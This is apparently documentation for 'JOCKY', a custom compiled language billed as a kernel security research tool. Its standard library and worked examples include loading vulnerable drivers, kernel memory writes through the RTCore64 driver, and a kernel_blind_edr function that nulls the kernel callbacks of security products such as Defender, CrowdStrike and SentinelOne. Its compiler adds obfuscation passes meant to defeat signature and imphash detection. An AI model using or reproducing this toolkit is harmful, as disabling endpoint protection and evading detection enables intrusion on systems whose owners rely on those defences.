# JOCKY Language Documentation

## Overview

JOCKY is a purpose-built compiled language for kernel security research. Source files use the `.jk` extension. The compiler transforms `.jk` source into LLVM IR, applies four obfuscation passes, and produces either a JIT-executed result or a standalone native `.exe` (via MinGW gcc linkage).

```
source.jk  →  Lexer  →  Parser  →  Semantic  →  CodeGen  →  ObfuscationPasses  →  LLVM IR  →  exe / JIT
```

---

## File Structure

```
source.jk          Your JOCKY program
compiler/          Compiler pipeline (Python)
  jocky/
    lexer.py       Tokeniser
    tokens.py      Token types and keyword map
    parser.py      AST builder
    semantic.py    Type checker
    codegen.py     LLVM IR generator
    passes.py      Obfuscation passes
    stdlib.py      JIT callbacks (Python)
  stdlib/
    forensics.c    Native C stdlib (linked into .exe)
    forensics.h    Header declarations
```

---

## Syntax

### Comments

```jocky
## This is a single-line comment
```

JOCKY uses `##` for comments. There are no block comments.

### Entry Point

Every JOCKY program must define a `start` function with no parameters and return type `nothing`.

```jocky
func start() -> nothing {
    report(`Hello from JOCKY!`)
}
```

### Function Definition

```jocky
func functionName(param1 : type1, param2 : type2) -> returnType {
    ## body
}
```

Functions with no return value use `-> nothing`. Parameters are separated by commas.

```jocky
func greet(name : text) -> nothing {
    report(name)
}

func add(a : num, b : num) -> num {
    give a + b
}
```

### Variable Declaration

```jocky
var name : type := expression
```

Variables must be declared with `:=` before use. All variables are block-scoped.

### Variable Reassignment

```jocky
name <- newExpression
```

Reassignment uses `<-`, not `=`. This distinguishes it clearly from declaration.

```jocky
var count : num := 0
count <- count + 1
```

---

## Types

| Type      | Description                                               | Example                       |
|-----------|-----------------------------------------------------------|-------------------------------|
| `num`     | 64-bit signed integer                                     | `var x : num := 42`           |
| `dec`     | 64-bit floating-point                                     | `var f : dec := 3.14`         |
| `text`    | String (UTF-8, backtick-delimited literals)               | `var s : text := \`hello\``   |
| `flag`    | Boolean — `yes` or `no`                                   | `var b : flag := yes`         |
| `raw`     | Opaque handle / void pointer — returned by stdlib calls   | `var r : raw := byovd_scan()` |
| `nothing` | Void — used as return type only, not a variable type      | `func f() -> nothing { }`     |

`raw` is the universal opaque handle type. All stdlib functions that return a list or buffer return `raw`, and you pass that handle back to companion functions (e.g. `byovd_driver_count(handle)`).

---

## Literals

```jocky
42               ## decimal integer
-17              ## negative integer
3.14             ## decimal float
`hello world`    ## string — always backtick-delimited
yes              ## boolean true
no               ## boolean false
empty            ## null / nil
```

String literals are always enclosed in backticks (`` ` ``), never double or single quotes.

---

## Operators

### Arithmetic

```jocky
a + b    ## addition
a - b    ## subtraction
a * b    ## multiplication
a / b    ## integer division
a mod b  ## modulo
```

### Comparison (word form)

```jocky
a is b    ## equal      (==)
a isnt b  ## not equal  (!=)
a gt b    ## greater    (>)
a lt b    ## less       (<)
a gte b   ## >=
a lte b   ## <=
```

### Logical (word form)

```jocky
a also b  ## logical AND  (&&)
a or b    ## logical OR   (||)
flip a    ## logical NOT  (!)
```

---

## Control Flow

### check / otherwise

`check` is the conditional statement (equivalent to `if`). `otherwise` is the optional else branch.

```jocky
check (condition) {
    ## true branch
} otherwise {
    ## false branch
}
```

There is no `else if` chaining — use nested `check` blocks or separate checks:

```jocky
check (x gt 0) {
    report(`positive`)
}
check (x lt 0) {
    report(`negative`)
}
check (x is 0) {
    report(`zero`)
}
```

### loop

`loop` is the while-style loop:

```jocky
loop (condition) {
    ## body
}
```

JOCKY has no `for` loop. Use a manual counter:

```jocky
var i : num := 0
loop (i lt 10) {
    report(`iteration`)
    i <- i + 1
}
```

### give

`give` returns a value from a function. In a `-> nothing` function, use bare `give` to return early.

```jocky
func abs(x : num) -> num {
    check (x lt 0) {
        give x * -1
    }
    give x
}

func early_exit(x : num) -> nothing {
    check (x is 0) {
        give
    }
    report(`not zero`)
}
```

### stop / skip

`stop` breaks out of a `loop`. `skip` continues to the next iteration.

---

## Standard Library Reference

All stdlib functions work in both JIT mode (Python callbacks in `stdlib.py`) and native mode (C implementations in `forensics.c`).

---

### Output

#### `report(message : text)`

Print a message to stdout.

```jocky
report(`Kernel scan complete.`)
```

---

### Process Enumeration

#### `procs_list() -> raw`

Enumerate all running processes. Returns an opaque `raw` handle.

- Windows: `EnumProcesses` + `QueryFullProcessImageNameA`
- Linux: reads `/proc/<pid>/comm`

```jocky
var p : raw := procs_list()
```

#### `proc_count(p : raw) -> num`

Number of processes in the list.

#### `proc_name(p : raw, i : num) -> text`

Name of the process at index `i` (0-based).

#### `proc_pid(p : raw, i : num) -> num`

PID of the process at index `i`.

#### `proc_kill(pid : num)`

Log a process termination attempt. In safe mode, reports only.

#### `proc_mem_read(pid : num, addr : num, size : num) -> raw`

Read memory from a process (simulation-safe).

#### Example — enumerate all processes

```jocky
func start() -> nothing {
    var p : raw := procs_list()
    var n : num := proc_count(p)
    var i : num := 0
    loop (i lt n) {
        report(proc_name(p, i))
        i <- i + 1
    }
}
```

---

### Network

#### `net_conns() -> raw`

Snapshot active TCP connections. Prints the connection table and returns an opaque handle.

- Windows: `GetExtendedTcpTable`
- Linux: `/proc/net/tcp`

```jocky
var conns : raw := net_conns()
```

#### `net_sniff(duration_ms : num) -> raw`

Capture network traffic for the given duration (milliseconds). Shows ESTABLISHED connections during the capture window. Returns an opaque handle.

```jocky
var packets : raw := net_sniff(500)
```

#### Example

```jocky
func start() -> nothing {
    var conns   : raw := net_conns()
    var packets : raw := net_sniff(1000)
    report(`Network capture complete`)
}
```

---

### Registry

#### `reg_read(key_path : text, value_name : text) -> text`

Read a single registry value from `HKEY_LOCAL_MACHINE\<key_path>`. Returns the value as a string, or empty string if not found.

```jocky
var shell : text := reg_read(`SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, `Shell`)
check (shell isnt `explorer.exe`) {
    report(`Winlogon Shell may be hijacked`)
}
```

#### `reg_list(key_path : text) -> raw`

Enumerate all subkeys under `HKEY_LOCAL_MACHINE\<key_path>`. Returns an opaque handle (full enumeration available in native build).

```jocky
var services : raw := reg_list(`SYSTEM\CurrentControlSet\Services`)
```

---

### File System

#### `file_list(path : text) -> raw`

List contents of a directory. Returns an opaque handle (full listing available in native build).

```jocky
var files : raw := file_list(`C:\Windows\System32\drivers`)
```

#### `file_read(path : text) -> text`

Read up to 65536 bytes from a file and return as a string.

```jocky
var content : text := file_read(`C:\Windows\System32\drivers\etc\hosts`)
report(content)
```

---

### System Information

#### `sys_info() -> text`

Return the OS platform string.

- Windows: `RtlGetVersion`
- Linux: `uname()` → `"Linux 6.x.x x86_64"`

```jocky
func start() -> nothing {
    var info : text := sys_info()
    report(info)
}
```

#### `hash_file(path : text) -> raw`

Compute SHA-256 of a file. Returns an opaque handle (hash value accessible in native build). In JIT mode, the hash is computed and logged.

```jocky
var h : raw := hash_file(`C:\Windows\System32\ntdll.dll`)
report(`ntdll.dll hashed`)
```

---

### BYOVD / Driver Scanner

#### `byovd_scan() -> raw`

Scan all kernel drivers against the LOLDrivers vulnerability database:
1. SHA-256 hash cross-reference (authoritative)
2. Filename fallback (weaker, used when hash unavailable)

- Windows: scans `%WINDIR%\System32\drivers\*.sys`
- Linux: walks `/lib/modules/<uname>/kernel/drivers/**/*.ko`

Returns an opaque scan handle.

```jocky
var results : raw := byovd_scan()
```

#### `byovd_driver_count(results : raw) -> num`

Number of vulnerable drivers found.

#### `byovd_driver_name(results : raw, i : num) -> text`

Filename of the vulnerable driver at index `i`.

#### `byovd_driver_path(results : raw, i : num) -> text`

Full filesystem path to the driver.

#### `byovd_driver_cve(results : raw, i : num) -> text`

CVE identifier for the vulnerability (e.g. `CVE-2019-16098`).

#### `byovd_driver_risk(results : raw, i : num) -> text`

Risk level string: `CRITICAL`, `HIGH`, `MEDIUM`, or `LOW`.

#### `byovd_load()`

Load a vulnerable driver (simulation-safe — logs action without touching kernel in JIT mode).

#### `byovd_unload()`

Unload a previously loaded driver (simulation-safe).

#### Example — full BYOVD scan

```jocky
func start() -> nothing {
    var results : raw := byovd_scan()
    var n       : num := byovd_driver_count(results)
    var i       : num := 0
    loop (i lt n) {
        report(byovd_driver_name(results, i))
        report(byovd_driver_cve(results, i))
        report(byovd_driver_risk(results, i))
        i <- i + 1
    }
}
```

---

### Kernel Operations

#### `kernel_base() -> num`

Resolve ntoskrnl.exe base address.

- Windows: raw `NtQuerySystemInformation(11)` buffer parse → avoids `c_void_p` sign truncation for addresses above `0x7FFFFFFFFFFFFFFF`; falls back to `psapi!EnumDeviceDrivers`
- Simulate mode: returns `0xFFFFF80000000000`

```jocky
var base : num := kernel_base()
```

#### `kernel_enum_callbacks() -> raw`

Enumerate `PspCreateProcessNotifyRoutine` callbacks. In simulation mode returns 10 realistic callbacks from ntoskrnl, hal, wdfilter, MsMpEng, CSFalcon, SentinelOne, etc.

```jocky
var cb_list : raw := kernel_enum_callbacks()
```

#### `kernel_callback_count(cb_list : raw) -> num`

Number of callbacks in the list.

#### `kernel_callback_addr(cb_list : raw, i : num) -> num`

Raw address of callback at index `i` (lock bits masked).

#### `kernel_callback_module(cb_list : raw, i : num) -> text`

Module name owning the callback (e.g. `ntoskrnl.exe`, `MsMpEng.sys`).

#### `kernel_read(addr : num, size : num) -> raw`

Read `size` bytes from kernel virtual address `addr` via RTCore64 IOCTL. Returns a buffer handle.

```jocky
var buf : raw := kernel_read(base, 8)
```

#### `kernel_write(addr : num, value : num)`

Write a value to kernel virtual address `addr` via RTCore64 IOCTL. Suppressed in simulation mode.

```jocky
kernel_write(callback_addr, 0)
```

#### `kernel_patch_callback(addr : num) -> num`

Null a single callback pointer at `addr`. Returns 1 on success.

#### `kernel_blind_edr() -> num`

Filter all non-Microsoft callbacks from the enumerated list and null each one. Returns number of callbacks patched.

```jocky
var patched : num := kernel_blind_edr()
```

#### Example — kernel reconnaissance

```jocky
func start() -> nothing {
    var base    : num := kernel_base()
    var cb_list : raw := kernel_enum_callbacks()
    var n       : num := kernel_callback_count(cb_list)
    var i       : num := 0
    loop (i lt n) {
        report(kernel_callback_module(cb_list, i))
        i <- i + 1
    }
    var patched : num := kernel_blind_edr()
    report(`EDR callbacks nulled`)
}
```

---

## Obfuscation Passes

When compiling to native binary (not JIT), four obfuscation passes run automatically:

### Pass 1 — Per-build ID

Injects a 16-byte random constant global `_jk_build_id`. Every compile produces a different value, making the binary hash unique without changing any logic.

### Pass 2 — XOR String Encryption

All string literals in the LLVM IR are XOR-encrypted with a per-build random 1-byte key. At runtime, `jk_xordecrypt()` (from `forensics.c`) decrypts them before use. Strings are never stored in plaintext in the binary.

### Pass 3 — Entropy Global

Injects `_jk_entropy`, a random 64-bit global, further increasing binary entropy to defeat simple signature matching.

### Pass 4 — Dead Code Companion Functions

Injects companion functions containing opaque predicates of the form `(N*(N+1)) % 2 == 0`. These always evaluate true at compile time but look like real branches to static analysis tools.

### Import Table Variation (Pass 5 — Link-time)

The `_jocky_entry.c` shim imports a randomly chosen subset of 4–12 decoy functions from different Windows DLLs (user32.dll, shell32.dll, wininet.dll, gdi32.dll, etc.). Every binary has a different import table, defeating imphash signatures.

---

## Compiling and Running

### JIT mode (no linker needed)

```bash
python jocky.py run scripts/byovd_scanner.jk
```

Compiles to LLVM IR, JIT-executes via MCJIT. Stdlib calls handled by Python callbacks in `stdlib.py`.

### Native binary mode

```bash
python jocky.py build scripts/byovd_scanner.jk
```

Emits `.o`, links with `forensics.o` and the import variation shim via gcc/MinGW. Output in `output/`.

### Compiler flags

| Flag              | Effect                                          |
|-------------------|-------------------------------------------------|
| `--run`           | JIT execute immediately                         |
| `--emit-ir`       | Save LLVM IR to `.ll` file                      |
| `--no-obfuscate`  | Skip obfuscation (debug builds)                 |
| `--obfuscate-jit` | Run structural passes in JIT mode               |
| `-o <dir>`        | Output directory (default: `output/`)           |

---

## Complete Example — BYOVD + EDR Recon

```jocky
func start() -> nothing {
    ## System fingerprint
    var info : text := sys_info()
    report(info)

    ## Kernel base
    var base : num := kernel_base()
    check (base is 0) {
        report(`Could not resolve kernel base`)
        give
    }
    report(`Kernel base resolved`)

    ## BYOVD scan
    var results : raw := byovd_scan()
    var nm      : num := byovd_driver_count(results)
    var i       : num := 0
    loop (i lt nm) {
        report(byovd_driver_name(results, i))
        report(byovd_driver_cve(results, i))
        report(byovd_driver_risk(results, i))
        i <- i + 1
    }

    ## Kernel callbacks
    var cb_list : raw := kernel_enum_callbacks()
    var nc      : num := kernel_callback_count(cb_list)
    var j       : num := 0
    loop (j lt nc) {
        report(kernel_callback_module(cb_list, j))
        j <- j + 1
    }

    ## Blind EDR
    var patched : num := kernel_blind_edr()
    report(`Reconnaissance complete`)
}
```
